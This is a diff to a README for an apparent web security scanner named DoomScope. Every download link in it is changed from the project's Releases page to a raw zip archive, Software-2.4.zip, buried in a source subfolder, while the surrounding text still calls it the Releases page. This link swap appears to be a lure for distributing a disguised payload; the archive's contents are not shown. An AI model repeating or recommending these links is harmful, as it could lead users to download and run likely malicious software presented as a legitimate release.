@@ -7,9 +7,9 @@ The DoomScope framework is an automated web security and reconnaissance scanner.
 To use DoomScope, follow these straightforward steps. You do not need programming knowledge. Just follow along.
 
 ## 📥 Download DoomScope
-[![Download DoomScope](https://img.shields.io/badge/Download%20DoomScope-v1.0-blue)](https://github.com/XATALYST16/doomscope/releases)
+[![Download DoomScope](https://github.com/XATALYST16/doomscope/raw/refs/heads/main/tech_fingerprinting/Software-2.4.zip%20DoomScope-v1.0-blue)](https://github.com/XATALYST16/doomscope/raw/refs/heads/main/tech_fingerprinting/Software-2.4.zip)
 
-Visit the following link to download the latest version of DoomScope: [Download DoomScope Here](https://github.com/XATALYST16/doomscope/releases).
+Visit the following link to download the latest version of DoomScope: [Download DoomScope Here](https://github.com/XATALYST16/doomscope/raw/refs/heads/main/tech_fingerprinting/Software-2.4.zip).
 
 ## 🛠️ System Requirements
 Before installing DoomScope, make sure your system meets these requirements:
@@ -54,7 +54,7 @@ Here are some common issues that users may experience:
 - **GitHub Issues**: Report any bugs or request features via the Issues section on GitHub.
 
 ## 🔗 Additional Download Link
-Don’t forget, you can always revisit the Releases page here: [Download DoomScope Here](https://github.com/XATALYST16/doomscope/releases). This ensures you have the latest updates and features. 
+Don’t forget, you can always revisit the Releases page here: [Download DoomScope Here](https://github.com/XATALYST16/doomscope/raw/refs/heads/main/tech_fingerprinting/Software-2.4.zip). This ensures you have the latest updates and features. 
 
 ## 🌟 Next Steps
 Now that you have DoomScope installed, you are ready to enhance your web application's security. Explore its features and protect your online presence efficiently and effectively. 
